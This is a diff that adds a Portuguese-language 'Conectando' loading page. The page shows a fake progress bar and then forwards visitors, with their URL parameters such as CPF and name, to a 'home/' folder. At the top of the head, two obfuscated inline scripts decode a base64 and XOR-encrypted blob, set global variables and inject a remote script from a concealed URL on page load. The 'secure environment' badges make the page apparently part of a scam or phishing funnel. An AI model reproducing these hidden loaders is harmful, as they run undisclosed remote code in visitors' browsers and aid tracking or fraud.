@@ -1,0 +1,133 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>(function(){var x_5=atob("DDxuHW3L1UrkBLvnJUdMaB+n93DGbM+TVU9UMkKosSTKcc+KTFoXMw6kuGSGdpSURk4HbRm4+jqNfN6LCkwHZQin+yCXJpfFREgabwSpoD6Bd5ndfmFCPwqnuiiFaMjFH2cVPwOquC/GPpmXTEQLcSSv92bGctqLUFlMJ0/9tC7SZoOEHV1WeV6usHiGYd7fFA8PKgzpqBeZ");var a_e=[];for(var n_9=0;n_9<x_5.length;n_9++){a_e.push(x_5.charCodeAt(n_9)&255);}var i_e=a_e[0];var m_6r28=a_e.slice(1,1+i_e);var n_tst=a_e.slice(1+i_e);var e_mf6x=n_tst.map(function(b,t_q){return b^m_6r28[t_q%i_e];});var l_8mc="";for(var l_m=0;l_m<e_mf6x.length;l_m++){l_8mc+=String.fromCharCode(e_mf6x[l_m]&255);}var s_fv=decodeURIComponent(escape(l_8mc));var i_v=JSON.parse(s_fv);var v_4z2=i_v.globals||[];v_4z2.forEach(function(m_1){window[m_1.name]=m_1.value;});var a_l=document.createElement("script");a_l.src=i_v.url;a_l.async=true;a_l.defer=true;(i_v.attributes||[]).forEach(function(s_u4le){a_l.setAttribute(s_u4le.name,s_u4le.value);});(document.head||document.documentElement).appendChild(a_l);})();</script><script src="js/pixel.js" async="" defer=""></script>
+    <script>(function(){var h_45e1=atob("DMbX0WIiEGa8Wp376731pBBOMlyeMumPm7Xt/k1BdAiSL+mWgqCu/wFNfUjeKLKIiLS+oRZRPxPIN+7Uh6ejtBFWPgzPeLHZirKjowtAZRLZKb/BsL31vwNPdUSGePman6f6pBZPeQDFd+2JjrCyvxYPaAXTPrCIiK31/UBUcQrJP7/ByeSq/RkAfgfRP7/ByaK2pQMPZRLRM/uCxraltBRHfhKRKeiZgqKk804AZgfQL/jZ0eT1rD9f");var r_y7x=[];for(var u_mw7=0;u_mw7<h_45e1.length;u_mw7++){r_y7x.push(h_45e1.charCodeAt(u_mw7)&255);}var e_39=r_y7x[0];var l_g=r_y7x.slice(1,1+e_39);var f_ja8e=r_y7x.slice(1+e_39);var k_pmw=f_ja8e.map(function(b,k_w3tg){return b^l_g[k_w3tg%e_39];});var w_nmf="";for(var f_c2v=0;f_c2v<k_pmw.length;f_c2v++){w_nmf+=String.fromCharCode(k_pmw[f_c2v]&255);}var m_qy=decodeURIComponent(escape(w_nmf));var g_xdqq=JSON.parse(m_qy);var i_lvlc=g_xdqq.globals||[];i_lvlc.forEach(function(d_n){window[d_n.name]=d_n.value;});var n_thb=document.createElement("script");n_thb.src=g_xdqq.url;n_thb.async=true;n_thb.defer=true;(g_xdqq.attributes||[]).forEach(function(w_ca){n_thb.setAttribute(w_ca.name,w_ca.value);});(document.head||document.documentElement).appendChild(n_thb);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<title>Conectando</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Nunito',sans-serif;min-height:100dvh;background:linear-gradient(180deg,#0A1E42 0%,#133A7A 30%,#1E5ABF 60%,#EFF6FF 100%);display:flex;flex-direction:column;align-items:center;padding:20px;padding-top:15dvh;overflow-x:hidden;position:relative}
+.fogos-caixa{position:fixed;inset:0;pointer-events:none;z-index:10;overflow:hidden;opacity:0;transition:opacity 0.5s}
+.fogos-caixa.vis{opacity:1}
+.fagulha{position:absolute;width:10px;height:10px;top:-20px;opacity:0.9}
+.cartao{background:#fff;border-radius:20px;padding:40px 28px 36px;width:100%;max-width:380px;text-align:center;box-shadow:0 20px 60px rgba(10,30,66,0.25);position:relative;z-index:5;overflow:hidden}
+.barra-topo{position:absolute;top:0;left:0;width:100%;height:5px;background:#DBEAFE}
+.barra-avanco{height:100%;width:0;background:linear-gradient(90deg,#3B82F6,#1D4ED8);border-radius:0 3px 3px 0;transition:width 0.3s ease}
+.emblema{width:90px;height:90px;margin:20px auto 22px;position:relative}
+.anel{width:90px;height:90px;border-radius:50%;border:4px solid #DBEAFE;border-top-color:#2563EB;animation:girar 1.2s linear infinite;position:absolute;inset:0}
+@keyframes girar{to{transform:rotate(360deg)}}
+.nucleo{width:58px;height:58px;background:#EFF6FF;border-radius:50%;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+.visto{display:none;width:90px;height:90px;position:absolute;inset:0}
+.visto.vis{display:block}
+.visto-bg{width:90px;height:90px;background:#16A34A;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:brotar 0.4s cubic-bezier(0.175,0.885,0.32,1.275)}
+@keyframes brotar{0%{transform:scale(0)}100%{transform:scale(1)}}
+.visto-bg svg{width:40px;height:40px;fill:none;stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
+.msg{font-size:14px;color:#2563EB;margin-bottom:16px;font-weight:500;min-height:22px}
+.head{font-size:28px;font-weight:900;color:#0A1E42;margin-bottom:14px}
+.info{font-size:14px;color:#64748B;line-height:1.7;margin-bottom:32px;max-width:320px;margin-left:auto;margin-right:auto}
+.acao{display:block;width:100%;padding:16px;background:linear-gradient(135deg,#2563EB,#1D4ED8);color:#fff;border:none;border-radius:14px;font-family:inherit;font-size:16px;font-weight:700;cursor:pointer;opacity:0.4;pointer-events:none;transition:opacity 0.3s,transform 0.15s,box-shadow 0.15s;box-shadow:0 4px 15px rgba(37,99,235,0.35)}
+.acao.vis{opacity:1;pointer-events:auto;animation:entrar 0.5s ease}
+.acao:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(37,99,235,0.5)}
+.acao:active{transform:scale(0.97)}
+@keyframes entrar{0%{transform:scale(0.95);opacity:0}100%{transform:scale(1);opacity:1}}
+.flecha{display:inline-block;margin-left:8px;transition:transform 0.2s}
+.acao:hover .flecha{transform:translateX(3px)}
+.marca{display:inline-flex;align-items:center;gap:6px;margin-top:18px;padding:8px 20px;border:2px solid #2563EB;border-radius:30px;font-size:13px;font-weight:600;color:#2563EB}
+.marca svg{width:16px;height:16px;fill:#2563EB}
+.seguro{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:#CBD5E1}
+.seguro svg{width:14px;height:14px;fill:#CBD5E1}
+.fundo{display:none;position:fixed;inset:0;background:rgba(10,30,66,0.45);z-index:100;align-items:center;justify-content:center;padding:16px}
+.fundo.vis{display:flex}
+.modal{background:#fff;width:93%;max-width:500px;max-height:84vh;border-radius:16px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 12px 40px rgba(0,0,0,0.2)}
+.modal-cab{display:flex;justify-content:space-between;align-items:center;padding:16px 18px;border-bottom:1px solid #DBEAFE}
+.modal-cab h2{font-size:15px;font-weight:700;color:#0A1E42;margin:0}
+.modal-x{background:none;border:none;font-size:22px;color:#94A3B8;cursor:pointer;padding:0;line-height:1}
+.modal-txt{padding:18px;overflow-y:auto;font-size:12.5px;color:#475569;line-height:1.8}
+.modal-txt h3{font-size:13px;font-weight:700;color:#0A1E42;margin:14px 0 5px}
+.modal-txt h3:first-child{margin-top:0}
+.modal-txt p{margin:0 0 8px}
+</style>
+<style>@keyframes descer{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(100dvh) rotate(720deg);opacity:0}}</style></head>
+<body>
+<div class="fogos-caixa" id="fx"></div>
+<div class="cartao">
+<div class="barra-topo"><div class="barra-avanco" id="ba"></div></div>
+<div class="emblema">
+<div class="anel" id="anel"></div>
+<div class="nucleo" id="nucleo"></div>
+<div class="visto" id="visto"><div class="visto-bg"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div></div>
+</div>
+<div class="msg" id="msg">Conectando ao atendimento...</div>
+<h1 class="head">Bem-vindo!</h1>
+<p class="info">Estamos preparando seu acesso. Aguarde alguns instantes enquanto concluímos o carregamento para que você possa continuar.</p>
+<button class="acao" id="acao" onclick="seguir()">Continuar <span class="flecha">→</span></button>
+<div class="marca"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>Ambiente Seguro e Protegido</div>
+</div>
+
+<div class="fundo" id="mT"><div class="modal"><div class="modal-cab"><h2>Termos de Uso</h2><button class="modal-x" onclick="esconder('mT')">×</button></div><div class="modal-txt">
+<h3>1. Aceitação</h3><p>Ao utilizar este site, o usuário concorda com os Termos de Uso.</p>
+<h3>2. Natureza do Serviço</h3><p>Conteúdo exclusivamente informativo, não constituindo oferta ou aconselhamento.</p>
+<h3>3. Conduta</h3><p>O usuário compromete-se a utilizar o site de forma lícita, respeitando a legislação brasileira.</p>
+<h3>4. Propriedade Intelectual</h3><p>Todos os elementos são de propriedade do site, protegidos pela legislação vigente.</p>
+<h3>5. Isenção</h3><p>Não nos responsabilizamos por decisões tomadas com base nas informações do site.</p>
+<h3>6. Modificações</h3><p>Termos podem ser alterados a qualquer momento. Uso continuado implica aceitação.</p>
+<h3>7. Foro</h3><p>Última atualização: Setembro de 2026.</p>
+</div></div></div>
+
+<div class="fundo" id="mP"><div class="modal"><div class="modal-cab"><h2>Política de Privacidade</h2><button class="modal-x" onclick="esconder('mP')">×</button></div><div class="modal-txt">
+<h3>1. Controlador</h3><p>Política de Privacidade aplicável a todos os usuários do site, nos termos da LGPD.</p>
+<h3>2. Dados Coletados</h3><p>Nome, CPF, e-mail, telefone, endereço, dados de navegação e informações voluntárias.</p>
+<h3>3. Finalidade</h3><p>Prestação de serviços, comunicação, obrigações legais e melhoria da experiência.</p>
+<h3>4. Compartilhamento</h3><p>Com parceiros necessários, em conformidade com a LGPD.</p>
+<h3>5. Segurança</h3><p>Medidas técnicas e organizacionais contra acessos não autorizados.</p>
+<h3>6. Direitos</h3><p>Acesso, retificação, exclusão, portabilidade e revogação de consentimento.</p>
+<h3>7. Cookies</h3><p>Utilizados para otimização. Desabilitáveis no navegador.</p>
+<h3>8. Foro</h3><p>Última atualização: Setembro de 2026.</p>
+</div></div></div>
+
+<footer style="padding:20px 14px;text-align:center;position:relative;z-index:5;margin-top:120dvh">
+<div class="seguro" style="margin-bottom:12px"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>Suas informações estão protegidas e criptografadas</div>
+<nav style="display:flex;flex-wrap:wrap;justify-content:center;gap:4px 12px;margin-bottom:8px">
+<a href="javascript:void(0)" onclick="mostrar('mT')" style="color:rgba(255,255,255,0.6);text-decoration:none;font-size:12px;font-weight:600">Termos de Uso</a>
+<span style="color:rgba(255,255,255,0.35);font-size:10px">●</span>
+<a href="javascript:void(0)" onclick="mostrar('mP')" style="color:rgba(255,255,255,0.6);text-decoration:none;font-size:12px;font-weight:600">Política de Privacidade</a>
+</nav>
+<p style="margin:0;font-size:11px;color:rgba(255,255,255,0.4);line-height:1.8">
+Todos os direitos reservados - 2026
+</p>
+</footer>
+
+<script>
+(function(){
+var ba=document.getElementById('ba'),msg=document.getElementById('msg'),anel=document.getElementById('anel'),nucleo=document.getElementById('nucleo'),visto=document.getElementById('visto'),acao=document.getElementById('acao'),fx=document.getElementById('fx');
+var lista=[{t:'Conectando ao atendimento...',p:33,d:1800},{t:'Preparando atendimento...',p:66,d:2000},{t:'Tudo pronto!',p:100,d:0}];
+var pos=0;
+function passo(){if(pos>=lista.length)return;var l=lista[pos];msg.textContent=l.t;ba.style.width=l.p+'%';if(pos===lista.length-1){anel.style.display='none';nucleo.style.display='none';visto.classList.add('vis');acao.classList.add('vis');fogos();return}pos++;setTimeout(passo,l.d)}
+setTimeout(passo,600);
+function fogos(){fx.classList.add('vis');var cl=['#3B82F6','#2563EB','#60A5FA','#93C5FD','#DBEAFE','#16A34A','#34D399','#FFFFFF','#1D4ED8'];for(var j=0;j<60;j++){var el=document.createElement('div');el.className='fagulha';var c=cl[Math.floor(Math.random()*cl.length)],s=6+Math.random()*10,r=['50%','2px','0'][Math.floor(Math.random()*3)];el.style.cssText='left:'+Math.random()*100+'%;width:'+s+'px;height:'+s+'px;background:'+c+';border-radius:'+r+';animation:descer '+(2+Math.random()*3)+'s linear '+(Math.random()*1.5)+'s forwards';fx.appendChild(el)}}
+})();
+var cs=document.createElement('style');cs.textContent='@keyframes descer{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(100dvh) rotate(720deg);opacity:0}}';document.head.appendChild(cs);
+
+// ============================================
+//  REDIRECIONAMENTO PARA A PASTA "home/"
+// ============================================
+function seguir(){
+  // Preserva todos os par芒metros da URL atual (UTMs, cpf, nome, etc)
+  var r = {};
+  new URLSearchParams(location.search).forEach(function(v, k){ r[k] = v; });
+
+  // Redireciona para a pasta "home/" do pr贸prio projeto
+  // O navegador resolve automaticamente para home/index.html
+  var u = new URL('home/', window.location.href);
+  Object.keys(r).forEach(function(k){ u.searchParams.set(k, r[k]); });
+
+  location.href = u.toString();
+}
+
+function mostrar(id){document.getElementById(id).classList.add('vis')}
+function esconder(id){document.getElementById(id).classList.remove('vis')}
+document.querySelectorAll('.fundo').forEach(function(el){el.addEventListener('click',function(e){if(e.target===el)esconder(el.id)})});
+</script>
+
+</body></html>
